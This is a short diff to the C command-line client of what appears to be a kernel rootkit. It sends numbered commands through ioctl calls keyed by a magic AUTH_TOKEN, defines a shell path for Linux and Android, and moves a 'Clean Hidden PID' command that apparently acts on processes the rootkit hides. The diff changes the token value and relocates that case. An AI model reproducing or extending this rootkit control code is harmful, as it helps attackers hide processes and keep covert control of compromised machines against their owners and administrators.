@@ -9,7 +9,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 
-#define AUTH_TOKEN 0x12345678
+#define AUTH_TOKEN 0x12945678
 
 #define SHELL "/bin/sh" // Linux
 //#define SHELL "/system/bin/sh" // Android
@@ -83,6 +83,14 @@ int main ( int argc, char *argv[] )
                 io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
             }
             break;
+
+        case 18:
+        {
+            printf("Clean Hidden PID\n");
+            rk_args.cmd = 18;
+            io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
+            break;
+        }
 
         case 3:
             {
@@ -255,13 +263,7 @@ int main ( int argc, char *argv[] )
             io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
             break;
 
-        case 18:
-            printf("Clean Hidden PID\n");
-            rk_args.cmd = 18;
-            io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
-            break;
-        
-	case 100:
+    case 100:
             {
                 printf("Null command\n");
 
